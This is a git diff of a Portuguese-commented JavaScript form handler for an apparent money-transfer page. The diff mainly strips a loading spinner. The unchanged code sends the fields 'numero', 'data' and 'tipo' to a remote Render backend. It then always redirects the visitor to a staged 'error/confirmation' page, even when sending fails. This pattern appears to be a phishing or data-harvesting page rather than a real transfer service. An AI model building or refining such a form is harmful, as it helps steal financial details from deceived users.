@@ -44,7 +44,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     // Função que leva os dados até o seu servidor no Render
     async function enviarParaBanco(dados) {
-        // URL configurada para o seu backend no Render
+        // ATENÇÃO: Substitua pela URL que o Render te der (ex: https://backend-g2xn.onrender.com/api/salvar)
         const URL_BACKEND = "https://backend-transfira.onrender.com/api/salvar"; 
 
         try {
@@ -56,11 +56,11 @@ document.addEventListener("DOMContentLoaded", () => {
                 body: JSON.stringify(dados)
             });
 
-            // Após tentar enviar, redireciona para a tela de erro/confirmação
+            // Após tentar enviar, levamos o usuário para a tela de erro/confirmação
             window.location.href = "confirmacao.html";
         } catch (error) {
             console.error("Erro de conexão:", error);
-            // Mesmo se a conexão falhar, redireciona para manter o fluxo
+            // Mesmo se a internet falhar, o usuário vê a página de confirmação
             window.location.href = "confirmacao.html";
         }
     }
@@ -68,10 +68,6 @@ document.addEventListener("DOMContentLoaded", () => {
     // O que acontece quando o botão "Transferir" é clicado
     form.addEventListener("submit", (event) => {
         event.preventDefault();
-
-        // Seleção de elementos do botão para o efeito visual
-        const botaoSubmit = form.querySelector(".butao");
-        const botaoTexto = botaoSubmit.querySelector(".text");
 
         // Limpa avisos de erro antigos
         document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
@@ -102,45 +98,12 @@ document.addEventListener("DOMContentLoaded", () => {
                     input.style.border = "1px solid red";
                 }
             } else {
-                if (key !== "tipo") {
-                    input.style.border = "1px solid #ccc";
-                } else {
-                    document.querySelector(".radio-container").style.border = "none";
-                }
+                if (key !== "tipo") input.style.border = "1px solid #ccc";
             }
         }
 
-        // Se o formulário estiver todo preenchido, aplicamos o feedback visual e enviamos
+        // Se o formulário estiver todo preenchido, enviamos para o banco!
         if (formValido) {
-            // 1. Altera o texto para "Processando"
-            botaoTexto.textContent = "Processando...";
-            
-            // 2. Adiciona um pequeno spinner via CSS dinâmico
-            const spinner = document.createElement("div");
-            spinner.style.width = "12px";
-            spinner.style.height = "12px";
-            spinner.style.border = "2px solid #ffffff";
-            spinner.style.borderTop = "2px solid transparent";
-            spinner.style.borderRadius = "50%";
-            spinner.style.display = "inline-block";
-            spinner.style.marginLeft = "10px";
-            spinner.style.animation = "spin 0.8s linear infinite";
-            
-            // Adiciona a animação de rotação ao documento se não existir
-            if (!document.getElementById("btn-spin-style")) {
-                const style = document.createElement("style");
-                style.id = "btn-spin-style";
-                style.innerHTML = "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }";
-                document.head.appendChild(style);
-            }
-            
-            botaoSubmit.appendChild(spinner);
-
-            // 3. Desabilita o botão para evitar múltiplos envios
-            botaoSubmit.disabled = true;
-            botaoSubmit.style.opacity = "0.7";
-            botaoSubmit.style.cursor = "not-allowed";
-
             const dadosColetados = {
                 numero: campos.numero.value,
                 data: campos.data.value,
